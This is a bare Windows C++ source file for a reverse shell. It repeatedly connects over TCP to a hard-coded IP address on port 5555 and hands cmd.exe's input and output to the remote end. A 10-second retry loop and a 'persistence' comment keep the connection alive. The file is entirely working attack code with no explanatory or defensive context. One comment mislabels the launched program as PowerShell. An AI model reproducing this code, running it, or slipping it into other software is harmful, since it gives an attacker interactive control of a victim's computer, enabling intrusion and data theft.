 // <- presisten

#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    while (true) {
        WSAStartup(MAKEWORD(2,2), &wsaData);
        sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(5555); // Port
        server.sin_addr.s_addr = inet_addr("172.31.184.178"); // IP

        if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), 0, 0, 0, 0) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            Sleep(10000); // 10 second delay
            continue;
        }

        // Setup process to redirect stdin, stdout, stderr
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

        // Launch PowerShell
        TCHAR cmd[] = TEXT("cmd.exe");
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        // Wait for process to end
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);
        WSACleanup();
    }

    return 0;
}
